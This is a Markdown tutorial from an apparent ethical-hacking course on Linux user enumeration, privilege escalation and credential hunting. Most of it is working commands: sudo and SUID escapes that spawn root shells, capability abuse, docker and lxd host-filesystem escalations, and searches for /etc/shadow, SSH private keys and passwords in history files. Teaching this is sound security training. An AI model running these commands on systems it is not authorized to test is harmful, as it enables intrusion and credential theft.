# Lesson 1.2: User & Permission Management

## Objective
Learn user enumeration, permission exploitation, and privilege escalation techniques.

---

## User Management Fundamentals

### Understanding /etc/passwd
```bash
cat /etc/passwd
```

**Format:** `username:x:UID:GID:comment:home:shell`

Example:
```
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:John Doe:/home/john:/bin/bash
```

- **UID 0** = Root user (target!)
- **UID 1-999** = System accounts
- **UID 1000+** = Regular users

**Hacking Use Case:** Enumerate valid usernames for brute force attacks

---

### Understanding /etc/shadow
```bash
sudo cat /etc/shadow
```

**Format:** `username:password_hash:last_change:min:max:warn:inactive:expire`

Example:
```
root:$6$xyz123...:18000:0:99999:7:::
```

**Hash Types:**
- `$1$` = MD5
- `$5$` = SHA-256
- `$6$` = SHA-512
- `$y$` = yescrypt

**Hacking Use Case:** If readable, crack password hashes with John or Hashcat

---

### Understanding /etc/group
```bash
cat /etc/group
```

Shows group memberships. Look for privileged groups:
- **sudo** - Can use sudo
- **wheel** - Admin group (RHEL/CentOS)
- **docker** - Can run Docker (privilege escalation!)
- **lxd** - Can use LXD containers (privilege escalation!)
- **adm** - Can read logs

---

## User Enumeration Commands

### Who's on the System?
```bash
whoami                  # Current user
id                      # User ID, groups
w                       # Who is logged in
who                     # Similar to w
last                    # Login history
lastlog                 # Last login per user
users                   # List current users
```

### Enumerate All Users
```bash
# List all users
cat /etc/passwd | cut -d: -f1

# List users with bash shells (likely interactive users)
cat /etc/passwd | grep bash | cut -d: -f1

# Count users
cat /etc/passwd | wc -l
```

### Check User Privileges
```bash
id                      # Your user info
sudo -l                 # What can I run with sudo?
groups                  # My groups
groups username         # Another user's groups
```

---

## Privilege Escalation Basics

### Sudo Misconfigurations

#### Check Sudo Permissions
```bash
sudo -l
```

**Look for:**
- `NOPASSWD` entries
- Wildcards in paths
- Dangerous binaries

#### Common Sudo Exploits
```bash
# If you can run vim with sudo:
sudo vim
:!bash              # Drops you into a root shell

# If you can run less with sudo:
sudo less /etc/hosts
!bash               # Root shell

# If you can run find with sudo:
sudo find / -exec /bin/bash \;

# If you can run awk with sudo:
sudo awk 'BEGIN {system("/bin/bash")}'

# If you can run python with sudo:
sudo python -c 'import os;os.system("/bin/bash")'
```

**Resource:** https://gtfobins.github.io/

---

### SUID Exploitation

#### Find SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Common SUID binaries that can be exploited:**

1. **find**
```bash
find /home -exec /bin/bash -p \;
```

2. **vim**
```bash
vim -c ':py import os; os.execl("/bin/bash", "bash", "-p")'
```

3. **nmap** (old versions)
```bash
nmap --interactive
!bash -p
```

4. **bash** (if SUID)
```bash
bash -p
```

5. **cp** (if SUID)
```bash
# Copy /etc/shadow to readable location
cp /etc/shadow /tmp/shadow
```

---

### Exploiting Capabilities

Linux capabilities allow fine-grained privilege control.

#### Check for Capabilities
```bash
getcap -r / 2>/dev/null
```

**Dangerous Capabilities:**

1. **cap_setuid+ep** on python
```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

2. **cap_dac_read_search+ep**
Read any file on the system

3. **cap_sys_admin+ep**
Mount filesystems, potential root access

---

## Credential Hunting

### Common Locations for Credentials

```bash
# Configuration files
grep -r "password" /etc/ 2>/dev/null
grep -r "PASSWORD" /var/www/html/ 2>/dev/null

# Database configs
cat /var/www/html/config.php
cat /var/www/html/wp-config.php

# Environment variables
env | grep -i "pass\|pwd\|secret\|key"

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.python_history

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null
```

---

## Group Exploitation

### Docker Group Privilege Escalation
If your user is in the `docker` group:

```bash
# Check if docker is available
id | grep docker

# Exploit: Mount host filesystem in container
docker run -v /:/mnt -it ubuntu chroot /mnt bash
```

Now you have root access to the host filesystem!

---

### LXD Group Privilege Escalation
```bash
# Check if in lxd group
id | grep lxd

# Exploit (simplified):
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
cd /mnt/root/root
```

---

## Hands-On Exercises

### Exercise 1: User Enumeration
```bash
# List all users
cat /etc/passwd | cut -d: -f1

# Find users with UID 0 (should only be root)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# List users who can login
grep -v nologin /etc/passwd | grep -v false

# Check which users have home directories
ls -la /home/
```

### Exercise 2: Privilege Checks
```bash
# What can I run with sudo?
sudo -l

# Am I in any privileged groups?
groups

# Check for SUID binaries
find / -perm -4000 2>/dev/null

# Check for capabilities
getcap -r / 2>/dev/null
```

### Exercise 3: Credential Hunting
```bash
# Search for passwords in files
grep -ri "password" /var/www/ 2>/dev/null

# Check history files
cat ~/.bash_history | grep -i "password\|ssh\|mysql"

# Find SSH keys
find /home -name "id_rsa" 2>/dev/null
```

---

## Practice Challenge

You've gained access to a system with a low-privilege user account. Your goal:
1. Enumerate all users on the system
2. Find SUID binaries that could lead to privilege escalation
3. Check for sudo misconfigurations
4. Hunt for credentials in common locations
5. Achieve root access

Create a script: `01-linux-basics/scripts/user_enum.sh`

---

## Security Best Practices (Defensive)

As an ethical hacker, you should also know how to defend:

1. **Minimize SUID binaries**
2. **Use strong password policies**
3. **Restrict sudo access**
4. **Monitor privileged group memberships**
5. **Protect SSH keys with proper permissions**
6. **Regularly audit user accounts**
7. **Remove unnecessary user accounts**

---

## Key Takeaways

1. User enumeration reveals potential attack targets
2. SUID binaries and sudo misconfigurations = easy privilege escalation
3. Group memberships (docker, lxd) can lead to root
4. Credentials are often hidden in config files and history
5. Always check capabilities for exploitation opportunities

---

## Resources

- GTFOBins: https://gtfobins.github.io/
- Linux Privilege Escalation Guide: https://book.hacktricks.xyz/linux-hardening/privilege-escalation

---

## Next Lesson
**Lesson 1.3: Process Management & System Monitoring** - Learn to analyze running processes, identify suspicious activity, and exploit process vulnerabilities.
